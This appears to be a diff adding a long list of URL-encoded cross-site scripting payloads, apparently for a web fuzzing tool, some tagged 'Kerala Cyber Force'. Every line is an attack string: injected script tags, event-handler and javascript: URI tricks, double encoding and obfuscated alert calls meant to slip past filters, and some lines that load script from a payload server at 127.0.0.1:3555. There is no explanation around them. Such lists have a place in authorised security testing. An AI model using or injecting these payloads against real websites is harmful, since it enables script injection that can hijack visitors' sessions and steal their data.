+'%3E%3CBR%20SIZE=%22&%7Balert(1)%7D%22%3E  
+&%3Cscript%3Ealert(1);%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1);%3C/script%3E  
+'%3E%3Cscript%3Ealert(1);%3C/script%3E  
+&%7Balert(1);%7D;  
+%3Cimg%20src=&%7Balert(1);%7D;%3E  
+%22%3E%3Cimg%20src=&%7Balert(1);%7D;%3E  
+'%3E%3Cimg%20src=&%7Balert(1);%7D;%3E  
+%3Cimg%20src=%22mocha:alert(1);%22%3E  
+%22%3E%3Cimg%20src=%22mocha:alert(1);%22%3E  
+'%3E%3Cimg%20src=%22mocha:alert(1);%22%3E  
+%3Cimg%20src=%22livescript:alert(1);%22%3E  
+%22%3E%3Cimg%20src=%22livescript:alert(1);%22%3E  
+'%3E%3Cimg%20src=%22livescript:alert(1);%22%3E  
+%3Ca%20href=%22about:%3Cscript%3Ealert(1);%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1);%3C/script%3E  
+'%3E%3Cscript%3Ealert(1);%3C/script%3E%22%3E  
+[/xC0][/xBC]script%3Ealert(1);[/xC0][/xBC]/script%3E%22%20%7D;  
+%3Cobject%20classid=%22clsid:...%22%20codebase=%22javascript:alert(1);%22%3E  
+%22%3E%3Cobject%20classid=%22clsid:...%22%20codebase=%22javascript:alert(1);%22%3E  
+'%3E%3Cobject%20classid=%22clsid:...%22%20codebase=%22javascript:alert(1);%22%3E  
+%3Cstyle%3E%3C!--%3C/style%3E%3Cscript%3Ealert(1);//--%3E%3C/script%3E  
+%22%3E%3Cstyle%3E%3C!--%3C/style%3E%3Cscript%3Ealert(1);//--%3E%3C/script%3E  
+'%3E%3Cstyle%3E%3C!--%3C/style%3E%3Cscript%3Ealert(1);//--%3E%3C/script%3E  
+%3C![CDATA[%3C!--]]%3Cscript%3Ealert(1);//--%3E%3C/script%3E  
+%22%3E%3C![CDATA[%3C!--]]%3Cscript%3Ealert(1);//--%3E%3C/script%3E  
+'%3E%3C![CDATA[%3C!--]]%3Cscript%3Ealert(1);//--%3E%3C/script%3E  
+%3C!--%20--%20--%3E%3Cscript%3Ealert(1);%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1);%3C/script%3E  
+'%3E%3Cscript%3Ealert(1);%3C/script%3E%3C!--%20--%20--%3E  
+javascript:/*--%3E]]%3E%%3E?%3E%3C/script%3E%3C/title%3E%3C/textare
+%3CEMBED%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/flash.swf%22%3E%3C/EMBED%3E  
+%22%3E%3CEMBED%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/flash.swf%22%3E%3C/EMBED%3E  
+'%3E%3CEMBED%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/flash.swf%22%3E%3C/EMBED%3E  
+%3Cimg%20src=%22http://127.0.0.1:3555/xss_serve_payloads/image.png%22%20onerror=alert(1)%3E  
+%22%3E%3Cimg%20src=%22http://127.0.0.1:3555/xss_serve_payloads/image.png%22%20onerror=alert(1)%3E  
+'%3E%3Cimg%20src=%22http://127.0.0.1:3555/xss_serve_payloads/image.png%22%20onerror=alert(1)%3E  
+%3Cimg%20src=%22http://127.0.0.1:3555/xss_serve_payloads/gif.gif%22%20onerror=alert(1)%3E  
+%22%3E%3Cimg%20src=%22http://127.0.0.1:3555/xss_serve_payloads/gif.gif%22%20onerror=alert(1)%3E  
+'%3E%3Cimg%20src=%22http://127.0.0.1:3555/xss_serve_payloads/gif.gif%22%20onerror=alert(1)%3E  
+%3Cscript%20type=%22text/javascript%22%3Ewindow.open(%22http://127.0.0.1:3555/xss_serve_payloads/X.html%22,%22_self%22);%3C/script%3E  
+%22%3E%3Cscript%20type=%22text/javascript%22%3Ewindow.open(%22http://127.0.0.1:3555/xss_serve_payloads/X.html%22,%22_self%22);%3C/script%3E  
+'%3E%3Cscript%20type=%22text/javascript%22%3Ewindow.open(%22http://127.0.0.1:3555/xss_serve_payloads/X.html%22,%22_self%22);%3C/script%3E  
+%3CSCRIPT%20=%22%3E%22%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%20=%22%3E%22%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%20=%22%3E%22%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E  
+%3CSCRIPT%20a=%22%3E%22%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%20a=%22%3E%22%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%20a=%22%3E%22%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E  
+%3CSCRIPT%20a=%22%3E%22%20''%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%20a=%22%3E%22%20''%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%20a=%22%3E%22%20''%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E  
+%3CSCRIPT%20%22a='%3E'%22%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%20%22a='%3E'%22%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%20%22a='%3E'%22%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E  
+%3CSCRIPT%20a=%60%3E%60%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%20a=%60%3E%60%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%20a=%60%3E%60%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E  
+%3CSCRIPT%20a=%22%3E'%3E%22%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%20a=%22%3E'%3E%22%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%20a=%22%3E'%3E%22%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E  
+%3CSCRIPT%20=%22%3E%22%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%20=%22%3E%22%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%20=%22%3E%22%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E  
+%3CSCRIPT%20a=%22%3E%22%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%20a=%22%3E%22%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%20a=%22%3E%22%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E  
+%3CSCRIPT%20a=%22%3E%22%20''%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%20a=%22%3E%22%20''%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%20a=%22%3E%22%20''%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E  
+%3CSCRIPT%20%22a='%3E'%22%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%20%22a='%3E'%22%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%20%22a='%3E'%22%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E  
+%3CSCRIPT%20a=%60%3E%60%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%20a=%60%3E%60%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%20a=%60%3E%60%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E  
+%3CSCRIPT%20a=%22%3E'%3E%22%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%20a=%22%3E'%3E%22%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%20a=%22%3E'%3E%22%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E  
+%3CTABLE%3E%3CTD%20BACKGROUND=%22javascript:alert(1)%22%3E  
+%22%3E%3CTABLE%3E%3CTD%20BACKGROUND=%22javascript:alert(1)%22%3E  
+'%3E%3CTABLE%3E%3CTD%20BACKGROUND=%22javascript:alert(1)%22%3E  
+%3Cimg%20src='http://127.0.0.1:3555/xss_serve_payloads/gif.gif'%20onload='document.scripts(0).src=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22'%3E  
+%22%3E%3Cimg%20src='http://127.0.0.1:3555/xss_serve_payloads/gif.gif'%20onload='document.scripts(0).src=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22'%3E  
+'%3E%3Cimg%20src='http://127.0.0.1:3555/xss_serve_payloads/gif.gif'%20onload='document.scripts(0).src=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22'%3E  
+%3Cimg%20src='http://127.0.0.1:3555/xss_serve_payloads/gif.gif'%20onload='document.scripts(0).src=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22'%3E  
+%22%3E%3Cimg%20src='http://127.0.0.1:3555/xss_serve_payloads/gif.gif'%20onload='document.scripts(0).src=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22'%3E  
+'%3E%3Cimg%20src='http://127.0.0.1:3555/xss_serve_payloads/gif.gif'%20onload='document.scripts(0).src=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22'%3E  
+%3Cimg%20src='http://127.0.0.1:3555/xss_serve_payloads/xxxgif.gif'%20onerror='document.scripts(0).src=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22'%3E  
+%22%3E%3Cimg%20src='http://127.0.0.1:3555/xss_serve_payloads/xxxgif.gif'%20onerror='document.scripts(0).src=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22'%3E  
+'%3E%3Cimg%20src='http://127.0.0.1:3555/xss_serve_payloads/xxxgif.gif'%20onerror='document.scripts(0).src=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22'%3E  
+%3Cimg%20src='http://127.0.0.1:3555/xss_serve_payloads/xxxgif.gif'%20onerror='document.scripts(0).src=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22'%3E  
+%22%3E%3Cimg%20src='http://127.0.0.1:3555/xss_serve_payloads/xxxgif.gif'%20onerror='document.scripts(0).src=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22'%3E  
+'%3E%3Cimg%20src='http://127.0.0.1:3555/xss_serve_payloads/xxxgif.gif'%20onerror='document.scripts(0).src=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22'%3E  
+%3Cimg%20src='http://127.0.0.1:3555/xss_serve_payloads/X.html'%20onload=alert(1)//%3E%3C/img%3E  
+%22%3E%3Cimg%20src='http://127.0.0.1:3555/xss_serve_payloads/X.html'%20onload=alert(1)//%3E%3C/img%3E  
+'%3E%3Cimg%20src='http://127.0.0.1:3555/xss_serve_payloads/X.html'%20onload=alert(1)//%3E%3C/img%3E  
+%3Cscript%3Ealert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])%3C/script%3E  
+%22%3E%3Cscript%3Ealert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])%3C/script%3E  
+'%3E%3Cscript%3Ealert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])%3C/script%3E  
+%3Cimg%20src=&  
+%22%3E%3Cimg%20src=&  
+'%3E%3Cimg%20src=&  
+%3CIMG%20SRC=&  
+%22%3E%3CIMG%20SRC=&  
+'%3E%3CIMG%20SRC=&  
+%3Cimg%20src=&  
+%22%3E%3Cimg%20src=&  
+'%3E%3Cimg%20src=&  
+%E2%80%9C%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+%22%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+'%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+%E2%80%9C%3E%3Cscript%3Ealert(String.fromCharCode(75,67,70))%3C/script%3E  
+%22%3E%3Cscript%3Ealert(String.fromCharCode(75,67,70))%3C/script%3E  
+'%3E%3Cscript%3Ealert(String.fromCharCode(75,67,70))%3C/script%3E  
+%E2%80%98%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+%22%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+'%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+%E2%80%98%3E%3Cscript%3Ealert(String.fromCharCode(75,67,70))%3C/script%3E  
+%22%3E%3Cscript%3Ealert(String.fromCharCode(75,67,70))%3C/script%3E  
+'%3E%3Cscript%3Ealert(String.fromCharCode(75,67,70))%3C/script%3E  
+%3CScRIPt%3Eprompt(1)%3C/ScRIPt%3E  
+%22%3E%3CScRIPt%3Eprompt(1)%3C/ScRIPt%3E  
+'%3E%3CScRIPt%3Eprompt(1)%3C/ScRIPt%3E  
+%3CScRIPt%3CaLeRT(String.fromCharCode(75,67,70))%3C/ScRIPt%3E  
+%22%3E%3CScRIPt%3CaLeRT(String.fromCharCode(75,67,70))%3C/ScRIPt%3E  
+'%3E%3CScRIPt%3CaLeRT(String.fromCharCode(75,67,70))%3C/ScRIPt%3E  
+%E2%80%9C%3E%3CScRIPt%3Eprompt(1)%3C/ScRIPt%3E  
+%22%3E%3CScRIPt%3Eprompt(1)%3C/ScRIPt%3E  
+'%3E%3CScRIPt%3Eprompt(1)%3C/ScRIPt%3E  
+%E2%80%9C%3E%3CScRIPt%3CaLeRT(String.fromCharCode(75,67,70))%3C/ScRIPt%3E  
+%22%3E%3CScRIPt%3CaLeRT(String.fromCharCode(75,67,70))%3C/ScRIPt%3E  
+'%3E%3CScRIPt%3CaLeRT(String.fromCharCode(75,67,70))%3C/ScRIPt%3E  
+%E2%80%98%3E%3CScRIPt%3Eprompt(1)%3C/ScRIPt%3E  
+%22%3E%3CScRIPt%3Eprompt(1)%3C/ScRIPt%3E  
+'%3E%3CScRIPt%3Eprompt(1)%3C/ScRIPt%3E  
+%E2%80%98%3E%3CScRIPt%3CaLeRT(String.fromCharCode(75,67,70))%3C/ScRIPt%3E  
+%22%3E%3CScRIPt%3CaLeRT(String.fromCharCode(75,67,70))%3C/ScRIPt%3E  
+'%3E%3CScRIPt%3CaLeRT(String.fromCharCode(75,67,70))%3C/ScRIPt%3E  
+%3C/script%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+%22%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+'%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+%22%3E%3C/script%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+%22%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+'%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+'%3E%3C/script%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+%22%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+'%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+%3C/script%3E%3Cscript%3Ealert(String.fromCharCode(75,67,70))%3C/script%3E  
+%22%3E%3C/script%3E%3Cscript%3Ealert(String.fromCharCode(75,67,70))%3C/script%3E  
+'%3E%3C/script%3E%3Cscript%3Ealert(String.fromCharCode(75,67,70))%3C/script%3E  
+%22%3E%3Cscript%3Ealert(String.fromCharCode(75,67,70))%3C/script%3E  
+'%3E%3Cscript%3Ealert(String.fromCharCode(75,67,70))%3C/script%3E  
+%E2%80%9C/%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+%22%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+'%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+%E2%80%9C/%3E%3Cscript%3Ealert(String.fromCharCode(75,67,70))%3C/script%3E  
+%22%3E%3Cscript%3Ealert(String.fromCharCode(75,67,70))%3C/script%3E  
+'%3E%3Cscript%3Ealert(String.fromCharCode(75,67,70))%3C/script%3E  
+%E2%80%98/%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+%22%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+'%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+%E2%80%98/%3E%3Cscript%3Ealert(String.fromCharCode(75,67,70))%3C/script%3E  
+%22%3E%3Cscript%3Ealert(String.fromCharCode(75,67,70))%3C/script%3E  
+'%3E%3Cscript%3Ealert(String.fromCharCode(75,67,70))%3C/script%3E  
+%3C/SCRIPT%3E%E2%80%9D%3E%3CSCRIPT%3Eprompt(1)%3C/SCRIPT%3E  
+%22%3E%3C/SCRIPT%3E%E2%80%9D%3E%3CSCRIPT%3Eprompt(1)%3C/SCRIPT%3E  
+'%3E%3C/SCRIPT%3E%E2%80%9D%3E%3CSCRIPT%3Eprompt(1)%3C/SCRIPT%3E  
+%3C/SCRIPT%3E%E2%80%9D%3E%3CSCRIPT%3Ealert(String.fromCharCode(75,67,70))  
+%22%3E%3C/SCRIPT%3E%E2%80%9D%3E%3CSCRIPT%3Ealert(String.fromCharCode(75,67,70))  
+'%3E%3C/SCRIPT%3E%E2%80%9D%3E%3CSCRIPT%3Ealert(String.fromCharCode(75,67,70))  
+%3C/SCRIPT%3E%E2%80%9D%3E%E2%80%9D%3E%3CSCRIPT%3Eprompt(1)%3C/SCRIPT%3E  
+%22%3E%3C/SCRIPT%3E%E2%80%9D%3E%E2%80%9D%3E%3CSCRIPT%3Eprompt(1)%3C/SCRIPT%3E  
+'%3E%3C/SCRIPT%3E%E2%80%9D%3E%E2%80%9D%3E%3CSCRIPT%3Eprompt(1)%3C/SCRIPT%3E  
+%3C/SCRIPT%3E%E2%80%9D%3E%E2%80%99%3E%3CSCRIPT%3Ealert(String.fromCharCode(75,67,70))%3C/SCRIPT%3E  
+%22%3E%3C/SCRIPT%3E%E2%80%9D%3E%E2%80%99%3E%3CSCRIPT%3Ealert(String.fromCharCode(75,67,70))%3C/SCRIPT%3E  
+'%3E%3C/SCRIPT%3E%E2%80%9D%3E%E2%80%99%3E%3CSCRIPT%3Ealert(String.fromCharCode(75,67,70))%3C/SCRIPT%3E  
+%27%3E%3Cscript%3EKCF%3C%2Fscript%3E  
+%22%3E%3Cscript%3EKCF%3C%2Fscript%3E  
+%2527%253E%253C%2573%2563%2572%2569%2570%2574%253E%254B%2543%2546%253C%252F%2573%2563%2572%2569%2570%2574%253E  
+%2522%253E%253C%2573%2563%2572%2569%2570%2574%253E%254B%2543%2546%253C%252F%2573%2563%2572%2569%2570%2574%253E  
+%2525%2532%2532%2525%2533%2545%2525%2533%2543%2525%2537%2533%2525%2536%2533%2525%2537%2532%2525%2536%2539%2525%2537%2530%2525%2537%2534%2525%2533%2545%2525%2534%2542%2525%2534%2533%2525%2534%2536%2525%2533%2543%2525%2532%2546%2525%2537%2533%2525%2536%2533%2525%2537%2532%2525%2536%2539%2525%2537%2530%2525%2537%2534%2525%2533%2545  
+%3Ch1%3EX%3C/h1%3E  
+%22%3E%3Ch1%3EX%3C/h1%3E  
+'%3E%3Ch1%3EX%3C/h1%3E  
+%3Cmarquee%3EKerala%20Cyber%20Force%3C/marquee%3E  
+%22%3E%3Cmarquee%3EKerala%20Cyber%20Force%3C/marquee%3E  
+'%3E%3Cmarquee%3EKerala%20Cyber%20Force%3C/marquee%3E  
+%3Cbr%3E%3Cbr%3E%3Cb%3E%3Cu%3EX%3C/u%3E%3C/b%3E  
+%22%3E%3Cbr%3E%3Cbr%3E%3Cb%3E%3Cu%3EX%3C/u%3E%3C/b%3E  
+'%3E%3Cbr%3E%3Cbr%3E%3Cb%3E%3Cu%3EX%3C/u%3E%3C/b%3E  
+%3Cscript%3Ewindow.open(%20%22http://127.0.0.1:3555/xss_serve_payloads/X.html%22%20)%3C/script%3E  
+%22%3E%3Cscript%3Ewindow.open(%20%22http://127.0.0.1:3555/xss_serve_payloads/X.html%22%20)%3C/script%3E  
+'%3E%3Cscript%3Ewindow.open(%20%22http://127.0.0.1:3555/xss_serve_payloads/X.html%22%20)%3C/script%3E  
+%3Cscript%3Ealert%281%29%3C/script%3E  
+%22%3E%3Cscript%3Ealert%281%29%3C/script%3E  
+'%3E%3Cscript%3Ealert%281%29%3C/script%3E  
+%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E/  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E/  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E/  
+%3Cscript%20language=vbscript%3Emsgbox%20X%3C/script%3E  
+%22%3E%3Cscript%20language=vbscript%3Emsgbox%20X%3C/script%3E  
+'%3E%3Cscript%20language=vbscript%3Emsgbox%20X%3C/script%3E  
+%3E%3C/title%3E%3Cscript%3Ealert(X)%3C/script%3E'%22%3E%3Cmarquee%3E%3Ch1%3EKerala%20Cyber%20Force%3C/h1%3E%3C/marquee%3E  
+%3CSCRIPT%3Edocument.write(%22%3CSCRI%22);%3C/SCRIPT%3EPT%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%3Edocument.write(%22%3CSCRI%22);%3C/SCRIPT%3EPT%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%3Edocument.write(%22%3CSCRI%22);%3C/SCRIPT%3EPT%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E  
+%3CSCRIPT%3Edocument.write(%22%3CSCRI%22);%3C/SCRIPT%3EPT%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%3Edocument.write(%22%3CSCRI%22);%3C/SCRIPT%3EPT%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%3Edocument.write(%22%3CSCRI%22);%3C/SCRIPT%3EPT%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E  
+%E2%80%98;!%E2%80%93%3CSCRIPT%3Ealert(String.fromCharCode(75,67,70))%3C/SCRIPT%3E=&%7B%7D  
+!%E2%80%93%3CSCRIPT%3Ealert(String.fromCharCode(75,67,70))%3C/SCRIPT%3E=&%7B%7D  
+%3Cimg%20src=%22blah%22onmouseover=%22alert(1);%22%3E  
+%22%3E%3Cimg%20src=%22blah%22onmouseover=%22alert(1);%22%3E  
+'%3E%3Cimg%20src=%22blah%22onmouseover=%22alert(1);%22%3E  
+%3Cimg%20src=%22blah%3E%22%20onmouseover=%22alert(1);%22%3E  
+%22%3E%3Cimg%20src=%22blah%3E%22%20onmouseover=%22alert(1);%22%3E  
+'%3E%3Cimg%20src=%22blah%3E%22%20onmouseover=%22alert(1);%22%3E  
+%3CIMG%20SRC=%22javascript:alert(1);%22  
+%22%3E%3CIMG%20SRC=%22javascript:alert(1);%22  
+'%3E%3CIMG%20SRC=%22javascript:alert(1);%22%3E  
+%22%3E%3CIMG%20SRC=%22javascript:alert(1);%22  
+%22%3E%3CIMG%20SRC=%22javascript:alert(1);%22  
+'%3E%3CIMG%20SRC=%22javascript:alert(1);%22%3E  
+'%3E%3CIMG%20SRC=%22javascript:alert(1);%22  
+%22%3E%3CIMG%20SRC=%22javascript:alert(1);%22  
+'%3E%3CIMG%20SRC=%22javascript:alert(1);%22%3E  
+%3CIMG%20SRC=%22javascript:alert(1);%22  
+%22%3E%3CIMG%20SRC=%22javascript:alert(1);%22  
+'%3E%3CIMG%20SRC=%22javascript:alert(1);%22  
+%3CIMG%20SRC=javascript:alert(1)%3E  
+%22%3E%3CIMG%20SRC=javascript:alert(1)%3E  
+'%3E%3CIMG%20SRC=javascript:alert(1)%3E  
+%3CIMG%20SRC=JaVaScRiPt:alert(1)%3E  
+%22%3E%3CIMG%20SRC=JaVaScRiPt:alert(1)%3E  
+'%3E%3CIMG%20SRC=JaVaScRiPt:alert(1)%3E  
+%3C/TITLE%3E%3CSCRIPT%3Ealert(1);%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%3Ealert(1);%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%3Ealert(1);%3C/SCRIPT%3E  
+%22%3E%3C/TITLE%3E%3CSCRIPT%3Ealert(1);%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%3Ealert(1);%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%3Ealert(1);%3C/SCRIPT%3E  
+'%3E%3C/TITLE%3E%3CSCRIPT%3Ealert(1);%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%3Ealert(1);%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%3Ealert(1);%3C/SCRIPT%3E  
+%3CIMG%20SRC=javascript:alert(&quot;X&quot;)%3E  
+%22%3E%3CIMG%20SRC=javascript:alert(&quot;X&quot;)%3E  
+'%3E%3CIMG%20SRC=javascript:alert(&quot;X&quot;)%3E  
+%3CIMG%20SRC=%60javascript:alert(%22Kerala%20Cyber%20Force,%20'X'%22)%60%3E  
+%22%3E%3CIMG%20SRC=%60javascript:alert(%22Kerala%20Cyber%20Force,%20'X'%22)%60%3E  
+'%3E%3CIMG%20SRC=%60javascript:alert(%22Kerala%20Cyber%20Force,%20'X'%22)%60%3E  
+%3CIMG%20%22%22%22%3E%3CSCRIPT%3Ealert(1)%3C/SCRIPT%3E%22%3E  
+%22%3E%3CIMG%20%22%22%22%3E%3CSCRIPT%3Ealert(1)%3C/SCRIPT%3E%22%3E  
+'%3E%3CIMG%20%22%22%22%3E%3CSCRIPT%3Ealert(1)%3C/SCRIPT%3E%22%3E  
+%3Cimg/src=%221%22/onerror=%22alert(1)%22  
+%22%3E%3Cimg/src=%221%22/onerror=%22alert(1)%22  
+'%3E%3Cimg/src=%221%22/onerror=%22alert(1)%22  
+SCRIPT%3E%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharCode(75,67,70))%3C/SCRIPT%3E  
+%3CIMG%20SRC=javascript:alert(String.fromCharCode(75,67,70))%3E  
+%22%3E%3CIMG%20SRC=javascript:alert(String.fromCharCode(75,67,70))%3E  
+'%3E%3CIMG%20SRC=javascript:alert(String.fromCharCode(75,67,70))%3E  
+%3CIMG%20SRC=%22javascript:alert(1);%22%3E  
+%22%3E%3CIMG%20SRC=%22javascript:alert(1);%22%3E  
+'%3E%3CIMG%20SRC=%22javascript:alert(1);%22%3E  
+%3CIMG%20SRC=%22jav&  
+%22%3E%3CIMG%20SRC=%22jav&  
+'%3E%3CIMG%20SRC=%22jav&  
+%3CIMG%20SRC=%22jav&  
+%22%3E%3CIMG%20SRC=%22jav&  
+'%3E%3CIMG%20SRC=%22jav&  
+%3CIMG%20SRC=%22jav&  
+%22%3E%3CIMG%20SRC=%22jav&  
+'%3E%3CIMG%20SRC=%22jav&  
+%3CIMG%20SRC=%22%20&  
+%22%3E%3CIMG%20SRC=%22%20&  
+'%3E%3CIMG%20SRC=%22%20&  
+%3Cscript%3Eprompt(1)%3C/script%3E  
+%22%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+'%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+%3CBODY%20onload!  
+%22%3E%3CBODY%20onload!  
+'%3E%3CBODY%20onload!  
+%3Cbody%20onload=%22alert(1);%22%3E  
+%22%3E%3Cbody%20onload=%22alert(1);%22%3E  
+'%3E%3Cbody%20onload=%22alert(1);%22%3E  
